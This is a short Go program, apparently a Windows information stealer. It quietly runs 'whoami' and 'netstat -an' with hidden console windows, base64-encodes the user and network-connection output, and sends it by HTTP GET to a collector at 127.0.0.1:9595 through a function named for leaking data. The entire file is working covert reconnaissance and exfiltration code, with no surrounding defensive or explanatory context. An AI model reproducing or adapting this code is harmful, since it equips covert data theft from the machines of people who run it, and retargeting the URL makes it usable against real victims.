package main

import (
	"encoding/base64"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"syscall"
	"time"
)

func sistemBilgisiTopla() string {
	if runtime.GOOS != "windows" {
		return "Bu araç sadece Windows işletim sisteminde çalışır."
	}

	cmd1 := exec.Command("cmd.exe", "/c", "whoami")
	cmd2 := exec.Command("cmd.exe", "/c", "netstat -an")

	cmd1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cikti1, _ := cmd1.Output()
	cikti2, _ := cmd2.Output()

	toplamRapor := "=== KULLANICI ===\n" + string(cikti1) + "\n=== AĞ BAĞLANTILARI ===\n" + string(cikti2)
	return toplamRapor
}

func veriSizdir(veri string) {
	b64Veri := base64.StdEncoding.EncodeToString([]byte(veri))
	urlUyumluVeri := url.QueryEscape(b64Veri)

	hedefURL := "http://127.0.0.1:9595/rapor?veri=" + urlUyumluVeri

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Get(hedefURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func main() {
	rapor := sistemBilgisiTopla()
	veriSizdir(rapor)
}
